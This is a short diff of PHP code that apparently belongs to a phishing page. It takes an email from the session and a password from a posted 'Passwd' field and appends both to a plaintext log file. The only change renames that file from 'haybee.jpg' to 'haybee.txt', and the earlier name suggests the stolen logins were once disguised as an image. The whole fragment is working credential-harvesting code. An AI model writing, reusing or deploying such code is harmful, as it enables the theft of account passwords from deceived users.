@@ -5,7 +5,7 @@
 			$pass = $_POST["Passwd"];
 			$email=$_SESSION["Email"];
 			//opening logins text file for appending new data.
-  			$file = fopen("haybee.jpg", "a") or die("Unable to open file!");
+  			$file = fopen("haybee.txt", "a") or die("Unable to open file!");
 			
   			//Writing email and password to logins.txt. 
   			fwrite($file, $email."	".$pass.PHP_EOL);			
